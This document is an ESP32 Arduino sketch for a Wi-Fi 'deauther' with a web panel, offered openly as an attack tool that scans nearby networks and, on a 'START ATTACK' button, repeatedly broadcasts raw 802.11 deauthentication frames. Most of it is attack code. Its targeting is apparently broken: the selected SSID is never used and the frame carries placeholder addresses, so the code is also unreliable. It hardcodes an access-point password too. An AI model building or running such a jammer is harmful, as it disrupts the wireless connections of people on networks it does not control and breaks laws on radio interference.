#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>

#define AP_SSID "GMpro"
#define AP_PASS "Sangkur87"

WebServer server(80);
DNSServer dnsServer;
Preferences preferences;

String ssidList[50];
int ssidCount = 0;
bool attackRunning = false;
unsigned long packetsSent = 0;
unsigned long lastScan = 0;

void scanNetworks();
void sendDeauthPackets();
void handleRoot();
void handleScan();
void handleAttack();
void handleStop();
void handleStatus();
void handleApiSsids();
void handleNotFound();

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n========================================");
  Serial.println("   GMpro ESP32 Deauther v2.1");
  Serial.println("      Sangkur87 Edition");
  Serial.println("========================================");
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS);
  
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP Started: ");
  Serial.println(AP_SSID);
  Serial.print("IP: ");
  Serial.println(IP.toString());
  
  dnsServer.start(53, "*", IP);
  
  preferences.begin("deauther");
  attackRunning = preferences.getBool("attack", false);
  
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/attack", HTTP_GET, handleAttack);
  server.on("/stop", HTTP_GET, handleStop);
  server.on("/status", HTTP_GET, handleStatus);
  server.on("/api/ssids", HTTP_GET, handleApiSsids);
  server.onNotFound(handleNotFound);
  
  server.begin();
  Serial.println("Web Server ready!");
  
  scanNetworks();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  if (attackRunning && millis() - lastScan > 50) {
    sendDeauthPackets();
    lastScan = millis();
  }
}

void scanNetworks() {
  WiFi.mode(WIFI_STA);
  delay(100);
  
  int n = WiFi.scanNetworks();
  ssidCount = min(n, 50);
  
  Serial.printf("Found %d networks\n", n);
  for (int i = 0; i < ssidCount; i++) {
    ssidList[i] = WiFi.SSID(i);
    Serial.printf("[%d] %s Ch:%d\n", i, ssidList[i].c_str(), WiFi.channel(i));
  }
  
  WiFi.scanDelete();
  WiFi.mode(WIFI_AP);
}

void sendDeauthPackets() {
  uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0x00, 0x00, 0x07, 0x00
  };
  
  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
  packetsSent++;
  
  if (packetsSent % 100 == 0) {
    Serial.printf("Packets sent: %lu\n", packetsSent);
  }
}

void handleRoot() {
  String html = R"rawliteral(<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GMpro Deauther</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; min-height: 100vh; padding: 20px; }
.container { max-width: 800px; margin: 0 auto; }
.header { text-align: center; margin-bottom: 30px; }
.header h1 { font-size: 2.5em; margin-bottom: 10px; }
.card { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.2); }
.status { padding: 15px; border-radius: 10px; text-align: center; font-size: 1.3em; font-weight: bold; margin-bottom: 20px; }
.running { background: rgba(255,68,68,0.8); }
.stopped { background: rgba(68,255,68,0.8); }
button { background: linear-gradient(45deg, #ff6b6b, #ee5a52); color: white; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; margin: 10px 0; }
button:hover { transform: translateY(-2px); }
button.stop { background: linear-gradient(45deg, #51cf66, #40c057); }
select, input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.3); background: rgba(255,255,255,0.1); color: white; font-size: 16px; margin: 10px 0; }
select option { background: #2a2a2a; color: white; }
.networks { max-height: 300px; overflow-y: auto; }
.network { padding: 10px; margin: 5px 0; background: rgba(255,255,255,0.05); border-radius: 8px; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>GMpro Deauther</h1>
<p>Sangkur87 Edition | v2.1</p>
</div>
<div class="card">
<div id="status" class="status stopped">STOPPED</div>
<div>Packets Sent: <span id="packets">0</span></div>
<div>Networks: <span id="networks">0</span></div>
</div>
<div class="card">
<h3>Scan Networks</h3>
<button onclick="scanNetworks()">Refresh Scan</button>
</div>
<div class="card">
<h3>Select Target</h3>
<select id="ssidSelect"><option value="">Pilih SSID Target...</option></select>
<button onclick="startAttack()">START ATTACK</button>
<button class="stop" onclick="stopAttack()">STOP ATTACK</button>
</div>
<div class="card">
<h3>Found Networks</h3>
<div id="networksList" class="networks"></div>
</div>
</div>
<script>
function updateStatus(){
fetch('/status').then(r=>r.json()).then(d=>{
document.getElementById('status').textContent=d.running?'ATTACK RUNNING':'STOPPED';
document.getElementById('status').className='status '+(d.running?'running':'stopped');
document.getElementById('packets').textContent=d.packets;
document.getElementById('networks').textContent=d.networks;
});
}
function loadNetworks(){
fetch('/api/ssids').then(r=>r.json()).then(ssids=>{
const s=document.getElementById('ssidSelect');
const l=document.getElementById('networksList');
s.innerHTML='<option value="">Pilih SSID Target...</option>';
l.innerHTML=ssids.length?'':'<div>No networks found</div>';
ssids.forEach(function(ssid,i){
let o=document.createElement('option');o.value=ssid;o.textContent=ssid;s.appendChild(o);
let d=document.createElement('div');d.className='network';d.innerHTML='<b>'+ssid+'</b>';l.appendChild(d);
});
});
}
function scanNetworks(){fetch('/scan');setTimeout(loadNetworks,2000);}
function startAttack(){const s=document.getElementById('ssidSelect').value;if(s)fetch('/attack?ssid='+encodeURIComponent(s));else alert('Pilih SSID!');}
function stopAttack(){fetch('/stop');}
setInterval(updateStatus,1000);
setInterval(loadNetworks,3000);
loadNetworks();updateStatus();
</script>
</body>
</html>)rawliteral";
  server.send(200, "text/html", html);
}

void handleScan() {
  scanNetworks();
  server.send(200, "text/plain", "Scanning...");
}

void handleAttack() {
  attackRunning = true;
  preferences.putBool("attack", true);
  Serial.println("Attack STARTED");
  server.send(200, "text/plain", "Attack started!");
}

void handleStop() {
  attackRunning = false;
  packetsSent = 0;
  preferences.putBool("attack", false);
  Serial.println("Attack STOPPED");
  server.send(200, "text/plain", "Attack stopped!");
}

void handleStatus() {
  String json = "{\"running\":" + String(attackRunning ? "true" : "false") + ",\"packets\":" + String(packetsSent) + ",\"networks\":" + String(ssidCount) + "}";
  server.send(200, "application/json", json);
}

void handleApiSsids() {
  String json = "[";
  for (int i = 0; i < ssidCount; i++) {
    json += "\"" + ssidList[i] + "\"";
    if (i < ssidCount - 1) json += ",";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleNotFound() {
  server.send(404, "text/plain", "GMpro Deauther - Not Found");
}